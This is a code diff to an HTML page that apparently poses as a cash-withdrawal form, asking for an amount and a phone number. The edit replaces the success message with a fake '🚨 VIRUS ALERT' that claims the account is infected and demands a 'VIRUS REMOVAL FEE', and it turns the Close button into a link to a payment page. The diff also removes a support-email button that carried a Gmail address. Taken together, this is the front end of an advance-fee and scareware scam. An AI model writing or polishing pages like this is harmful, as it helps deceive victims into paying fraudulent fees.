@@ -98,7 +98,7 @@
 
     .modal-content h3 {
       font-size: 22px;
-      color: green;
+      color: red;
       margin-bottom: 15px;
     }
 
@@ -114,6 +114,8 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
     }
 
     .close-btn:hover {
@@ -133,14 +135,15 @@
     <form id="withdrawForm">
       <label for="amount">Amount (Max 7 digits):</label>
       <input
-        type="text"
-        id="amount"
-        name="amount"
-        required
-        pattern="^\d{1,7}$"
-        title="Enter up to 7 digits (numbers only)"
-        placeholder="Enter amount"
-      />
+  type="text"
+  id="amount"
+  name="amount"
+  required
+  pattern="^[\d,]{1,11}$"
+  title="Enter a valid amount (up to 7 digits)"
+  placeholder="Enter amount"
+/>
+
 
       <label for="phone">Enter Phone Number:</label>
       <input
@@ -160,75 +163,50 @@
   <!-- Modal -->
   <div id="successModal" class="modal">
     <div class="modal-content">
-      <h3>🎉 Congratulations!</h3>
-      <p>You have successfully made a withdrawal.<br>Your amount will arrive at your mobile phone number within 24 hours.<br><strong>PLEASE WAIT!!</strong></p>
-      <button class="close-btn" onclick="closeModal()">Close</button>
+      <h3>🚨 VIRUS ALERT!!!</h3>
+      <p>
+        Dear User, Our System has detected unusually operation on this Account as it has been affected with <strong>VIRUSES</strong> that prevent your Withdrawal to be completed.<br><br>
+        You're required to <strong>Pay for VIRUS REMOVAL FEE</strong> in order to receive your withdrawal successfully.
+      </p>
+      <a href="payment.html" class="close-btn">Close</a>
     </div>
   </div>
 
   <script>
-    const form = document.getElementById('withdrawForm');
-    const modal = document.getElementById('successModal');
+  const form = document.getElementById('withdrawForm');
+  const modal = document.getElementById('successModal');
+  const amountInput = document.getElementById('amount');
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault(); // prevent actual submission
-      if (form.checkValidity()) {
-        modal.style.display = 'block';
-      }
-    });
+  // Format number with commas
+  function formatNumberWithCommas(value) {
+    const digitsOnly = value.replace(/\D/g, "");
+    return digitsOnly.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+  }
 
-    function closeModal() {
+  // Update input as user types
+  amountInput.addEventListener('input', () => {
+    const cursorPosition = amountInput.selectionStart;
+    const digitsOnly = amountInput.value.replace(/\D/g, "");
+    const formatted = formatNumberWithCommas(digitsOnly);
+    amountInput.value = formatted;
+  });
+
+  // Handle form submission
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (form.checkValidity()) {
+      modal.style.display = 'block';
+    }
+  });
+
+  // Allow clicking outside modal to close
+  window.onclick = function(event) {
+    if (event.target == modal) {
       modal.style.display = 'none';
-      form.reset(); // Optionally reset form after closing
+      form.reset();
     }
-
-    // Close modal if clicked outside content
-    window.onclick = function(event) {
-      if (event.target == modal) {
-        closeModal();
-      }
-    }
-  </script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Email Us Button</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-    }
-
-    .email-button {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      background-color: darkred;
-      color: white;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 5px;
-      text-decoration: none;
-      font-size: 16px;
-      font-family: Arial, sans-serif;
-      z-index: 1000;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-    }
-
-    .email-button:hover {
-      background-color: #a10000;
-    }
-  </style>
-</head>
-<body>
-
-  <a href="mailto:officialvideofunds@gmail.com?subject=Support%20Request" class="email-button">
-    Email Us
-  </a>
+  }
+</script>
 
 </body>
 </html>
